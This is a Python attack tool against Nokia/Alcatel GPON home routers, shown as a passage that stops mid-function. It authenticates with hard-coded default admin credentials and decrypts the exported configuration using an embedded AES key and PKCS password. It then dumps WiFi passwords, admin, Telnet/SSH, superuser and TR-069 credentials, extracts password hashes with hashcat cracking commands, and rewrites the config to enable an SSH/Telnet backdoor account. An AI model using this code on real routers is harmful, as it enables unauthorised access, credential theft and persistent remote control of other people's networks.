#!/usr/bin/env python3

import requests
import os
import sys
import re
import json
import time
import random
import argparse
import subprocess
import io
import zlib
import struct
import base64
import binascii
import hashlib
import secrets
from datetime import datetime
from xml.etree import ElementTree as ET
from Crypto.Cipher import AES
from hashlib import pbkdf2_hmac
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Util.Padding import pad, unpad

def u32_pack(val, big_endian=True):
    return struct.pack('>I' if big_endian else '<I', val)

def u32_unpack(val, big_endian=True):
    return struct.unpack('>I' if big_endian else '<I', val)[0]

def check_endian(cfg):
    if cfg[0:4] == b'\x00\x12\x31\x23':
        return True
    elif cfg[0:4] == b'\x23\x31\x12\x00':
        return False
    else:
        return None

class RouterCrypto:
    
    def __init__(self):

        key = '3D A3 73 D7 DC 82 2E 2A 47 0D EC 37 89 6E 80 D7 2C 49 B3 16 29 DD C9 97 35 4B 84 03 91 77 9E A4'
        iv  = 'D0 E6 DC CD A7 4A 00 DF 76 0F C0 85 11 CB 05 EA'
        
        self.cipher = AES.new(bytes(bytearray.fromhex(key)), AES.MODE_CBC, bytes(bytearray.fromhex(iv)))
    
    def decrypt(self, data):
        output = self.cipher.decrypt(data)
        
        padLen = ord(output[-1:])
        if padLen <= 0 or padLen > 16:
            return None
        
        padBytes = output[-padLen:]
        validPad = all(padByte == padLen for padByte in padBytes)
        if validPad:
            return output[:-padLen]
        else:
            return None
    
    def encrypt(self, data):

        pad_num = (16 - (len(data) % 16))
        data += chr(pad_num).encode() * pad_num
        
        return self.cipher.encrypt(data)

class PKCSPassCrypto(RouterCrypto):
    
    def __init__(self, pkcsPass, pkcsSalt):
        keyLen = 32
        ivLen = 16
        
        if not isinstance(pkcsPass, bytes):
            pkcsPass = pkcsPass.encode()
        
        pkcs = pbkdf2_hmac('sha256', pkcsPass, pkcsSalt, 10, dklen=keyLen+ivLen)
        keyBytes = pkcs[:keyLen]
        ivBytes = pkcs[keyLen:]
        self.cipher = AES.new(keyBytes, AES.MODE_CBC, ivBytes)

PKCS_PASSWORDS = ["S23l7nZm47XyMGs6y6oJpN9CR4nbfIZHJ4VRwp7HcdV6o2YvUmeNYFlz08Otwz78"]

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class Nanokia:
    
    def __init__(self, target_ip, username="AdminGPON", password="ALC#FGU", verbose=False, output_dir=None):
        self.target = f"http://{target_ip}"
        self.username = username
        self.password = password
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.sid = None
        self.csrf_token = None
        self.pubkey = None
        self.nonce = None
        self.original_config_encrypted = False
        self.original_config_endian = True
        self.original_config_pkcs_pass = None
        self.original_config_fw_magic = 0xffffffff
        
        if output_dir:
            self.output_dir = output_dir
        else:
            self.output_dir = "naNOKIA_configs"
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            if verbose:
                print(f"{Colors.CYAN}[DEBUG]{Colors.RESET} Created output directory: {self.output_dir}")
        
        requests.packages.urllib3.disable_warnings()
        
    def log(self, message, color=Colors.WHITE, prefix="[*]"):
        print(f"{color}{prefix}{Colors.RESET} {message}")
    
    def verbose_log(self, message):
        if self.verbose:
            self.log(message, Colors.CYAN, "[DEBUG]")
    
    def sha256_hash(self, data):
        return hashlib.sha256(data.encode()).digest()
    
    def sha256_base64(self, val1, val2):
        data = f"{val1}:{val2}"
        hash_val = self.sha256_hash(data)
        return base64.b64encode(hash_val).decode()
    
    def base64url_escape(self, b64):
        return b64.replace('+', '-').replace('/', '_').replace('=', '.')
    
    def base64url_unescape(self, b64url):
        return b64url.replace('-', '+').replace('_', '/').replace('.', '=')
    
    def extract_login_params(self, html):
        try:

            nonce_match = re.search(r'var nonce = "([^"]+)"', html)
            if not nonce_match:
                nonce_match = re.search(r"var nonce = '([^']+)'", html)
            
            if nonce_match:
                self.nonce = nonce_match.group(1)
                self.verbose_log(f"Extracted nonce: {self.nonce[:20]}...")
            else:
                self.log("Warning: Could not find nonce", Colors.YELLOW, "[WARN]")
            
            csrf_match = re.search(r'var csrf_token_login = "([^"]+)"', html)
            if not csrf_match:
                csrf_match = re.search(r"var csrf_token_login = '([^']+)'", html)
            
            if not csrf_match:
                csrf_match = re.search(r'var token\s*=\s*"([^"]+)"', html)
            if not csrf_match:
                csrf_match = re.search(r"var token\s*=\s*'([^']+)'", html)
            
            if csrf_match:
                self.csrf_token = csrf_match.group(1)
                self.verbose_log(f"Extracted CSRF token: {self.csrf_token[:20]}...")
            else:

                self.csrf_token = ""
                self.verbose_log("CSRF token not found on login page (will be empty)")
            
            pubkey_match = re.search(r"var pubkey = '([^']+)'", html, re.DOTALL)
            if not pubkey_match:
                pubkey_match = re.search(r'var pubkey = "([^"]+)"', html, re.DOTALL)
            
            if pubkey_match:
                self.pubkey = pubkey_match.group(1).replace('\\n', '\n').replace('\\', '')
                self.verbose_log(f"Extracted public key")
            else:
                self.log("Warning: Could not find public key", Colors.YELLOW, "[WARN]")
            
            if self.nonce and self.pubkey:
                return True
            else:
                self.log("Missing required parameters (nonce or pubkey)", Colors.RED, "[ERROR]")
                return False
                
        except Exception as e:
            self.log(f"Error extracting login parameters: {e}", Colors.RED, "[ERROR]")
            return False
    
    def encrypt_with_rsa_aes(self, plaintext):
        try:

            aes_key = get_random_bytes(16)
            aes_iv = get_random_bytes(16)
            
            cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
            padded_plaintext = pad(plaintext.encode(), AES.block_size)
            ciphertext = cipher.encrypt(padded_plaintext)
            
            ct_b64 = base64.b64encode(ciphertext).decode()
            
            key_info = base64.b64encode(aes_key).decode() + ' ' + base64.b64encode(aes_iv).decode()
            
            rsa_key = RSA.import_key(self.pubkey)
            cipher_rsa = PKCS1_v1_5.new(rsa_key)
            
            ck = cipher_rsa.encrypt(key_info.encode())
            ck_b64 = base64.b64encode(ck).decode()
            
            ct_url = self.base64url_escape(ct_b64)
            ck_url = self.base64url_escape(ck_b64)
            
            return {'ct': ct_url, 'ck': ck_url}
        except Exception as e:
            self.log(f"Encryption error: {e}", Colors.RED, "[ERROR]")
            return None
    
    def login(self):
        self.log("Attempting to authenticate...", Colors.YELLOW)
        
        try:

            self.verbose_log("Fetching login page...")
            response = self.session.get(f"{self.target}/")
            
            if response.status_code != 200:
                self.log(f"Failed to fetch login page: HTTP {response.status_code}", Colors.RED, "[ERROR]")
                return False
            
            if not self.extract_login_params(response.text):
                self.log("Failed to extract login parameters", Colors.RED, "[ERROR]")
                return False
            
            self.verbose_log("Building login post data...")
            
            enc_key = base64.b64encode(get_random_bytes(16)).decode()
            enc_iv = base64.b64encode(get_random_bytes(16)).decode()
            
            from urllib.parse import quote
            postdata = f"&username={self.username}&password={quote(self.password)}&csrf_token={self.csrf_token}&nonce={self.nonce}"
            postdata += f"&enckey={self.base64url_escape(enc_key)}&enciv={self.base64url_escape(enc_iv)}"
            
            self.verbose_log(f"Post data (before encryption): {postdata[:100]}...")
            
            encrypted = self.encrypt_with_rsa_aes(postdata)
            if not encrypted:
                self.log("Failed to encrypt login data", Colors.RED, "[ERROR]")
                return False
            
            encrypted_postdata = f"encrypted=1&ct={encrypted['ct']}&ck={encrypted['ck']}"
            
            self.verbose_log("Sending login request...")
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = self.session.post(
                f"{self.target}/login.cgi",
                data=encrypted_postdata,
                headers=headers,
                allow_redirects=False
            )
            
            if response.status_code == 299 and 'X-SID' in response.headers:
                self.sid = response.headers['X-SID']
                self.log(f"Successfully authenticated! Session ID: {self.sid}", Colors.GREEN, "[+]")
                if self.verbose:
                    self.verbose_log(f"Session cookies: {dict(self.session.cookies)}")
                return True
            else:
                self.log(f"Authentication failed: HTTP {response.status_code}", Colors.RED, "[ERROR]")
                if self.verbose:
                    self.verbose_log(f"Response headers: {dict(response.headers)}")
                    self.verbose_log(f"Response body: {response.text[:500] if response.text else '(empty)'}")
                    self.verbose_log(f"Response cookies: {dict(response.cookies)}")
                else:

                    if response.text and len(response.text) < 200:
                        self.log(f"Response: {response.text}", Colors.YELLOW, "[INFO]")
                return False
                
        except Exception as e:
            self.log(f"Login error: {e}", Colors.RED, "[ERROR]")
            if self.verbose:
                import traceback
                traceback.print_exc()
            return False
    
    def download_config(self, output_file="config.cfg"):
        self.log("Downloading configuration file...", Colors.YELLOW)
        
        output_file = os.path.join(self.output_dir, output_file)
        
        try:
            if self.verbose:
                self.verbose_log(f"Cookies for backup request: {dict(self.session.cookies)}")
            
            backup_page = self.session.get(f"{self.target}/usb.cgi?backup")
            
            if self.verbose:
                self.verbose_log(f"Backup page status: {backup_page.status_code}")
                self.verbose_log(f"Backup page length: {len(backup_page.text)} bytes")
            
            if backup_page.status_code != 200:
                self.log(f"Failed to access backup page: HTTP {backup_page.status_code}", Colors.RED, "[ERROR]")
                return False
            
            csrf_match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', backup_page.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)
                self.verbose_log(f"Extracted CSRF token for backup: {csrf_token}")
            else:
                self.log("Warning: Could not extract CSRF token from backup page", Colors.YELLOW, "[WARN]")
                if self.verbose:
                    self.verbose_log(f"Backup page preview: {backup_page.text[:500]}")
                csrf_token = ""
            
            export_data = {
                'csrf_token': csrf_token,
                'csrf_val': ''
            }
            response = self.session.post(f"{self.target}/usb.cgi?export", data=export_data)
            
            if self.verbose:
                self.verbose_log(f"Backup response status: {response.status_code}")
                self.verbose_log(f"Content-Type: {response.headers.get('Content-Type', 'unknown')}")
                self.verbose_log(f"Content-Length: {response.headers.get('Content-Length', 'unknown')}")
                self.verbose_log(f"First 100 bytes: {response.content[:100]}")
            
            if response.status_code == 200:

                if response.content.startswith(b'<') or b'<html' in response.content[:200].lower():
                    self.log("Router returned HTML instead of config file", Colors.RED, "[ERROR]")
                    if self.verbose:
                        self.verbose_log(f"HTML content: {response.text[:300]}")
                    return False
                
                with open(output_file, 'wb') as f:
                    f.write(response.content)
                self.log(f"Configuration downloaded: {output_file} ({len(response.content)} bytes)", Colors.GREEN, "[+]")
                return True
            else:
                self.log(f"Failed to download config: HTTP {response.status_code}", Colors.RED, "[ERROR]")
                return False
        except Exception as e:
            self.log(f"Download error: {e}", Colors.RED, "[ERROR]")
            return False
    
    def decrypt_config(self, config_file="config.cfg", tool_path=None):
        self.log("Decrypting configuration file...", Colors.YELLOW)
        
        try:

            if not os.path.dirname(config_file):
                config_file = os.path.join(self.output_dir, config_file)
            
            with open(config_file, 'rb') as cf:
                cfg_data = cf.read()
            
            big_endian = check_endian(cfg_data)
            encrypted_cfg = False
            pkcsPass = None
            
            if big_endian == None:
                decrypted = None
                try:
                    decrypted = RouterCrypto().decrypt(cfg_data)
                    big_endian = check_endian(decrypted)
                except ValueError:
                    pass
                
                if big_endian == None:
                    self.log("Invalid cfg file/magic", Colors.RED, "[ERROR]")
                    return None
                
                self.verbose_log("Encrypted cfg detected")
                cfg_data = decrypted
                encrypted_cfg = True
            
            self.original_config_encrypted = encrypted_cfg
            self.original_config_endian = big_endian
            self.verbose_log(f"Original config: encrypted={encrypted_cfg}, big_endian={big_endian}")
            
            if self.verbose:
                endian_msg = "big endian" if big_endian else "little endian"
                self.verbose_log(f"{endian_msg} CPU detected")
            
            data_size = u32_unpack(cfg_data[0x04:0x08], big_endian)
            
            large_header = False
            if data_size == 0:
                data_size = u32_unpack(cfg_data[0x08:0x0C], big_endian)
                large_header = True
            
            if data_size == 0:
                self.log("Config data size is 0", Colors.RED, "[ERROR]")
                return None
            
            if large_header:
                compressed = cfg_data[0x28 : 0x28 + data_size]
                checksum = u32_unpack(cfg_data[0x10:0x14], big_endian)
                fw_magic = u32_unpack(cfg_data[0x20:0x24], big_endian)
            else:
                compressed = cfg_data[0x14 : 0x14 + data_size]
                checksum = u32_unpack(cfg_data[0x08:0x0C], big_endian)
                fw_magic = u32_unpack(cfg_data[0x10:0x14], big_endian)
            
            self.original_config_fw_magic = fw_magic
            self.verbose_log(f"fw_magic = {hex(fw_magic)}")
            
            if (binascii.crc32(compressed) & 0xFFFFFFFF != checksum):
                self.log("CRC32 checksum failed", Colors.RED, "[ERROR]")
                return None
            
            xml_data = None
            try:
                xml_data = zlib.decompress(compressed)
                pkcsPass = None
            except zlib.error:
                encData = None
                pkcsSalt = None
                tryPasswords = []
                
                if compressed[0] == 0xFF:
                    tryPasswords = PKCS_PASSWORDS
                    with io.BytesIO(compressed) as payload:
                        payload.seek(1)
                        pkcsSalt = payload.read(8)
                        encData = payload.read()
                
                for currPass in tryPasswords:
                    decryptor = PKCSPassCrypto(currPass, pkcsSalt)
                    compressed = decryptor.decrypt(encData)
                    if compressed is None:
                        continue
                    
                    try:
                        xml_data = zlib.decompress(compressed)
                        pkcsPass = currPass
                        self.verbose_log(f"PKCS password found: {currPass[:20]}...")
                        break
                    except zlib.error:
                        pass
                
                if xml_data is None:
                    self.log("Failed to decrypt config (exhausted passwords)", Colors.RED, "[ERROR]")
                    return None
            
            self.original_config_pkcs_pass = pkcsPass
            if pkcsPass:
                self.verbose_log(f"Config uses PKCS password encryption")
            
            out_filename = f'config-{datetime.now().strftime("%d%m%Y-%H%M%S")}.xml'
            if xml_data[0] != ord('<'):
                out_filename = out_filename.replace('.xml', '.ini')
            
            xml_file_path = os.path.join(self.output_dir, out_filename)
            with open(xml_file_path, 'wb') as of:
                of.write(xml_data)
            
            self.log(f"Configuration decrypted: {xml_file_path}", Colors.GREEN, "[+]")
            return xml_file_path
            
        except Exception as e:
            self.log(f"Decryption error: {e}", Colors.RED, "[ERROR]")
            return None
    
    def list_devices(self, xml_file):
        self.log("Parsing connected devices from configuration...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            device_pattern = r'<Device\.\d+\.[^>]*>(.*?)</Device\.\d+\.>'
            devices = re.findall(device_pattern, content, re.DOTALL)
            
            if not devices:
                self.log("No devices found in configuration", Colors.YELLOW, "[INFO]")
                return
            
            print("\n" + "="*80)
            print(f"{Colors.GREEN}{'CONNECTED DEVICES':^80}{Colors.RESET}")
            print("="*80)
            print(f"{Colors.CYAN}{'#':<5} {'MAC Address':<20} {'IP Address':<18} {'Status':<10} {'IPv6 Address'}{Colors.RESET}")
            print("-"*80)
            
            device_count = 0
            for i, device in enumerate(devices, 1):

                mac_match = re.search(r'<MACAddress[^>]*v="([^"]+)"', device)
                mac = mac_match.group(1) if mac_match else "N/A"
                
                ip_match = re.search(r'<X_ASB_COM_IPAddress[^>]*v="([^"]+)"', device)
                ip = ip_match.group(1) if ip_match else "N/A"
                
                status_match = re.search(r'<X_ASB_COM_Status[^>]*v="(\d+)"', device)
                status_code = status_match.group(1) if status_match else "0"
                status = "Active" if status_code == "1" else "Inactive" if status_code == "2" else "Unknown"
                
                ipv6_match = re.search(r'<IPv6Address[^>]*v="([^"]+)"', device)
                ipv6 = ipv6_match.group(1) if ipv6_match else "N/A"
                
                if mac == "N/A" and ip == "N/A":
                    continue
                
                device_count += 1
                
                if status == "Active":
                    status_colored = f"{Colors.GREEN}{status}{Colors.RESET}"
                elif status == "Inactive":
                    status_colored = f"{Colors.YELLOW}{status}{Colors.RESET}"
                else:
                    status_colored = status
                
                print(f"{device_count:<5} {mac:<20} {ip:<18} {status_colored:<20} {ipv6}")
            
            print("="*80)
            self.log(f"Found {device_count} connected device(s)", Colors.GREEN, "[+]")
            print()
            
        except FileNotFoundError:
            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
        except Exception as e:
            self.log(f"Error parsing devices: {e}", Colors.RED, "[ERROR]")
    
    def dump_wifi_credentials(self, xml_file):
        self.log("Extracting WiFi credentials...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            wlan_pattern = r'<WLANConfiguration\.\d+\..*?</WLANConfiguration\.\d+\.>'
            wlans = re.findall(wlan_pattern, content, re.DOTALL)
            
            if not wlans:
                self.log("No WiFi configurations found", Colors.YELLOW, "[INFO]")
                return
            
            print("\n" + "="*80)
            print(f"{Colors.GREEN}{'WiFi CREDENTIALS':^80}{Colors.RESET}")
            print("="*80)
            print(f"{Colors.CYAN}{'#':<5} {'SSID':<30} {'Password':<25} {'Enabled'}{Colors.RESET}")
            print("-"*80)
            
            wifi_count = 0
            for i, wlan in enumerate(wlans, 1):

                ssid_match = re.search(r'<SSID[^>]*v="([^"]+)"', wlan)
                ssid = ssid_match.group(1) if ssid_match else "N/A"
                
                if not ssid or ssid == "N/A" or ssid in ["True", "False", "false", "true"]:
                    continue
                
                password = None
                
                psk_section = re.search(r'<PreSharedKey\.\d+\..*?</PreSharedKey\.\d+\.>', wlan, re.DOTALL)
                if psk_section:

                    for pattern in [r'<PreSharedKey[^>]*v="([^"]+)"',
                                   r'<DefaultPreSharedKey[^>]*v="([^"]+)"',
                                   r'<KeyPassphrase[^>]*v="([^"]+)"']:
                        pass_match = re.search(pattern, psk_section.group(0))
                        if pass_match and pass_match.group(1) and pass_match.group(1) not in ["", "NA", "N/A"]:
                            password = pass_match.group(1)
                            break
                else:

                    for pattern in [r'<KeyPassphrase[^>]*v="([^"]+)"', 
                                   r'<PreSharedKey[^>]*v="([^"]+)"',
                                   r'<WPAKey[^>]*v="([^"]+)"']:
                        pass_match = re.search(pattern, wlan)
                        if pass_match and pass_match.group(1):
                            password = pass_match.group(1)
                            break
                
                if not password or password in ["", "NA", "N/A"]:
                    password = "N/A"
                
                enabled_match = re.search(r'<Enable[^>]*v="([^"]+)"', wlan)
                enabled = enabled_match.group(1) if enabled_match else "Unknown"
                enabled_display = f"{Colors.GREEN}Yes{Colors.RESET}" if enabled.lower() == "true" else f"{Colors.YELLOW}No{Colors.RESET}"
                
                wifi_count += 1
                print(f"{wifi_count:<5} {ssid:<30} {password:<25} {enabled_display}")
            
            print("="*80)
            self.log(f"Found {wifi_count} WiFi network(s)", Colors.GREEN, "[+]")
            print()
            
        except FileNotFoundError:
            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
        except Exception as e:
            self.log(f"Error extracting WiFi credentials: {e}", Colors.RED, "[ERROR]")
    
    def dump_all_accounts(self, xml_file):
        self.log("Extracting user accounts...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            print("\n" + "="*80)
            print(f"{Colors.GREEN}{'USER ACCOUNTS & CREDENTIALS':^80}{Colors.RESET}")
            print("="*80)
            
            accounts_found = 0
            
            web_account = re.search(r'<WebAccount\..*?</WebAccount\.>', content, re.DOTALL)
            if web_account:
                username = re.search(r'<UserName[^>]*v="([^"]+)"', web_account.group(0))
                password = re.search(r'<Password[^>]*v="([^"]+)"', web_account.group(0))
                if username and password:
                    print(f"\n{Colors.CYAN}[1] Web Admin Account:{Colors.RESET}")
                    print(f"    Username: {Colors.GREEN}{username.group(1)}{Colors.RESET}")
                    print(f"    Password: {Colors.GREEN}{password.group(1)}{Colors.RESET}")
                    accounts_found += 1
            
            telnet_account = re.search(r'<TelnetSshAccount\..*?</TelnetSshAccount\.>', content, re.DOTALL)
            if telnet_account:
                username = re.search(r'<UserName[^>]*v="([^"]+)"', telnet_account.group(0))
                password = re.search(r'<Password[^>]*v="([^"]+)"', telnet_account.group(0))
                enabled = re.search(r'<Enable[^>]*v="([^"]+)"', telnet_account.group(0))
                if username or password:
                    print(f"\n{Colors.CYAN}[2] Telnet/SSH Account:{Colors.RESET}")
                    if username:
                        print(f"    Username: {Colors.GREEN}{username.group(1)}{Colors.RESET}")
                    if password:
                        print(f"    Password: {Colors.GREEN}{password.group(1)}{Colors.RESET}")
                    if enabled:
                        status = "Enabled" if enabled.group(1).lower() == "true" else "Disabled"
                        print(f"    Status: {status}")
                    accounts_found += 1
            
            super_user = re.search(r'<X_ASB_COM_SuperUserName[^>]*v="([^"]+)"', content)
            super_pass = re.search(r'<X_ASB_COM_SuperUserPassword[^>]*v="([^"]+)"', content)
            if super_user or super_pass:
                print(f"\n{Colors.CYAN}[3] Super User Account:{Colors.RESET}")
                if super_user:
                    print(f"    Username: {Colors.GREEN}{super_user.group(1)}{Colors.RESET}")
                if super_pass:
                    print(f"    Password: {Colors.GREEN}{super_pass.group(1)}{Colors.RESET}")
                accounts_found += 1
            
            tr069_section = re.search(r'<TR069Client\..*?</TR069Client\.>', content, re.DOTALL)
            if not tr069_section:
                tr069_section = re.search(r'<ManagementServer\..*?</ManagementServer\.>', content, re.DOTALL)
            
            if tr069_section:
                username = re.search(r'<Username[^>]*v="([^"]+)"', tr069_section.group(0))
                password = re.search(r'<Password[^>]*v="([^"]+)"', tr069_section.group(0))
                url = re.search(r'<URL[^>]*v="([^"]+)"', tr069_section.group(0))
                if username or password or url:
                    print(f"\n{Colors.CYAN}[4] TR-069 Remote Management:{Colors.RESET}")
                    if url:
                        print(f"    ACS URL: {url.group(1)}")
                    if username:
                        print(f"    Username: {Colors.GREEN}{username.group(1)}{Colors.RESET}")
                    if password:
                        print(f"    Password: {Colors.GREEN}{password.group(1)}{Colors.RESET}")
                    accounts_found += 1
            
            print("\n" + "="*80)
            self.log(f"Found {accounts_found} account(s)", Colors.GREEN, "[+]")
            print()
            
        except FileNotFoundError:
            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
        except Exception as e:
            self.log(f"Error extracting accounts: {e}", Colors.RED, "[ERROR]")
    
    def get_system_info(self, xml_file):
        self.log("Extracting system information...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            print("\n" + "="*80)
            print(f"{Colors.GREEN}{'ROUTER SYSTEM INFORMATION':^80}{Colors.RESET}")
            print("="*80)
            
            fields = {
                'Model Name': r'<ModelName[^>]*v="([^"]+)"',
                'Serial Number': r'<SerialNumber[^>]*v="([^"]+)"',
                'Hardware Version': r'<HardwareVersion[^>]*v="([^"]+)"',
                'Software Version': r'<SoftwareVersion[^>]*v="([^"]+)"',
                'MAC Address': r'<MACAddress[^>]*v="([a-fA-F0-9:]{17})"',
                'WAN IP': r'<ExternalIPAddress[^>]*v="([0-9.]+)"',
                'WAN Gateway': r'<DefaultGateway[^>]*v="([0-9.]+)"',
                'WAN MAC': r'<MACAddress[^>]*v="([a-fA-F0-9:]{17})".*?WAN',
            }
            
            print()
            for field_name, pattern in fields.items():
                matches = re.findall(pattern, content, re.DOTALL)
                if matches:

                    unique = list(set(matches))
                    if unique and unique[0]:
                        print(f"{Colors.CYAN}{field_name}:{Colors.RESET} {unique[0]}")
            
            print("\n" + "="*80)
            self.log("System info extracted", Colors.GREEN, "[+]")
            print()
            
        except FileNotFoundError:
            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
        except Exception as e:
            self.log(f"Error extracting system info: {e}", Colors.RED, "[ERROR]")
    
    def dump_tr069_config(self, xml_file):
        self.log("Extracting TR-069 configuration...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            tr069_section = re.search(r'<TR069Client\..*?</TR069Client\.>', content, re.DOTALL)
            if not tr069_section:
                tr069_section = re.search(r'<ManagementServer\..*?</ManagementServer\.>', content, re.DOTALL)
            
            if not tr069_section:
                self.log("No TR-069 configuration found", Colors.YELLOW, "[INFO]")
                return
            
            print("\n" + "="*80)
            print(f"{Colors.GREEN}{'TR-069 REMOTE MANAGEMENT CONFIGURATION':^80}{Colors.RESET}")
            print("="*80)
            print()
            
            fields = {
                'ACS URL': r'<URL[^>]*v="([^"]+)"',
                'Username': r'<Username[^>]*v="([^"]+)"',
                'Password': r'<Password[^>]*v="([^"]+)"',
                'Connection Request URL': r'<ConnectionRequestURL[^>]*v="([^"]+)"',
                'Connection Request Username': r'<ConnectionRequestUsername[^>]*v="([^"]+)"',
                'Connection Request Password': r'<ConnectionRequestPassword[^>]*v="([^"]+)"',
            }
            
            section_text = tr069_section.group(0)
            for field_name, pattern in fields.items():
                match = re.search(pattern, section_text)
                if match and match.group(1):
                    value = match.group(1)
                    if 'Password' in field_name or 'Username' in field_name:
                        print(f"{Colors.CYAN}{field_name}:{Colors.RESET} {Colors.GREEN}{value}{Colors.RESET}")
                    else:
                        print(f"{Colors.CYAN}{field_name}:{Colors.RESET} {value}")
            
            print("\n" + "="*80)
            self.log("TR-069 config extracted", Colors.GREEN, "[+]")
            print()
            
        except FileNotFoundError:
            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
        except Exception as e:
            self.log(f"Error extracting TR-069 config: {e}", Colors.RED, "[ERROR]")
    
    def dump_password_hashes(self, xml_file):
        self.log("Extracting password hashes...", Colors.YELLOW)
        
        try:
            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            print("\n" + "="*80)
            print(f"{Colors.GREEN}{'PASSWORD HASHES (for offline cracking)':^80}{Colors.RESET}")
            print("="*80)
            
            hash_count = 0
            
            print(f"\n{Colors.CYAN}[1] Account Password Hashes (SHA-256 crypt):{Colors.RESET}")
            print("-"*80)
            
            account_sections = re.findall(r'<Account\..*?</Account\.>', content, re.DOTALL)
            for account in account_sections:
                username_match = re.search(r'<UserName[^>]*v="([^"]+)"', account)
                password_match = re.search(r'<Password[^>]*v="(\$5\$[^"]+)"', account)
                
                if password_match:
                    username = username_match.group(1) if username_match else "Unknown"
                    hash_value = password_match.group(1)
                    print(f"  {Colors.YELLOW}Username:{Colors.RESET} {username}")
                    print(f"  {Colors.RED}Hash:{Colors.RESET} {hash_value}")
                    print(f"  {Colors.CYAN}Format:{Colors.RESET} SHA-256 crypt (hashcat mode: 7400)")
                    print()
                    hash_count += 1
            
            print(f"{Colors.CYAN}[2] WiFi Password Hashes (SHA-256 hex):{Colors.RESET}")
            print("-"*80)
            
            wlan_sections = re.findall(r'<WLANConfiguration\.\d+\..*?</WLANConfiguration\.\d+\.>', content, re.DOTALL)
            for wlan in wlan_sections:
                ssid_match = re.search(r'<SSID[^>]*v="([^"]+)"', wlan)
                ssid = ssid_match.group(1) if ssid_match else "Unknown"
                
                if not ssid or ssid in ["True", "False", "true", "false", "N/A"]:
                    continue
                
                psk_section = re.search(r'<PreSharedKey\.\d+\..*?</PreSharedKey\.\d+\.>', wlan, re.DOTALL)
                if psk_section:
                    hash_match = re.search(r'<X_ASB_COM_PreSharedKey[^>]*v="([a-f0-9]{64})"', psk_section.group(0))
                    if hash_match and hash_match.group(1):
                        hash_value = hash_match.group(1)
                        
                        plaintext_match = re.search(r'<PreSharedKey[^>]*v="([^"]+)"', psk_section.group(0))
                        plaintext = plaintext_match.group(1) if plaintext_match and plaintext_match.group(1) not in ["", "NA", "N/A"] else None
                        
                        print(f"  {Colors.YELLOW}SSID:{Colors.RESET} {ssid}")
                        if plaintext:
                            print(f"  {Colors.GREEN}Plaintext Password:{Colors.RESET} {plaintext}")
                        print(f"  {Colors.RED}Hash:{Colors.RESET} {hash_value}")
                        print(f"  {Colors.CYAN}Format:{Colors.RESET} SHA-256 raw hex (hashcat mode: 1400)")
                        print()
                        hash_count += 1
            
            if hash_count == 0:
                print(f"\n  {Colors.YELLOW}No password hashes found{Colors.RESET}")
            else:
                print("="*80)
                print(f"{Colors.CYAN}Hashcat Commands:{Colors.RESET}")
                print(f"  SHA-256 crypt: {Colors.GREEN}hashcat -m 7400 -a 0 hashes.txt wordlist.txt{Colors.RESET}")
                print(f"  SHA-256 raw:   {Colors.GREEN}hashcat -m 1400 -a 0 hashes.txt wordlist.txt{Colors.RESET}")
            
            print("\n" + "="*80)
            self.log(f"Found {hash_count} password hash(es)", Colors.GREEN, "[+]")
            print()
            
        except FileNotFoundError:
            self.log(f"Config file not found: {xml_file}", Colors.RED, "[ERROR]")
        except Exception as e:
            self.log(f"Error extracting password hashes: {e}", Colors.RED, "[ERROR]")
    
    def modify_config(self, xml_file, ssh_username="ONTUSER", ssh_password="admin"):
        self.log("Modifying configuration to enable SSH/Telnet...", Colors.YELLOW)
        
        try:

            with open(xml_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            self.verbose_log("Disabling LimitAccount_ONTUSER...")
            content = re.sub(
                r'<LimitAccount_ONTUSER[^>]*v="true"[^>]*>',
                '<LimitAccount_ONTUSER rw="RW" t="boolean" v="false">',
                content
            )
            
            self.verbose_log("Enabling TelnetSshAccount...")
            
            telnet_pattern = r'(<TelnetSshAccount\.[^>]*>)(.*?)(</TelnetSshAccount\.>)'
            match = re.search(telnet_pattern, content, re.DOTALL)
            
            if match:

                new_section = f'''<TelnetSshAccount. n="TelnetSshAccount" t="staticObject">
<Enable rw="RW" t="boolean" v="True"></Enable>
<UserName ml="64" rw="RW" t="string" v="{ssh_username}"></UserName>
<Password ml="64" rw="RW" t="string" v="{ssh_password}"></Password>
</TelnetSshAccount.>'''
                
                content = content[:match.start()] + new_section + content[match.end():]
            else:
                self.log("Warning: TelnetSshAccount section not found", Colors.YELLOW, "[WARN]")
            
            self.verbose_log("Enabling SSH/Telnet in LanAccessCfg section...")
            
            lan_access_pattern = r'(<X_ALU-COM_LanAccessCfg\.[^>]*>)(.*?)(</X_ALU-COM_LanAccessCfg\.>)'
            lan_match = re.search(lan_access_pattern, content, re.DOTALL)
            
            if lan_match:
                lan_content = lan_match.group(2)
                
                lan_content = re.sub(
                    r'<SshDisabled[^>]*v="[Tt]rue"[^>]*>',
                    '<SshDisabled dv="true" rw="RW" t="boolean" v="False">',
                    lan_content,
                    flags=re.IGNORECASE
                )
                
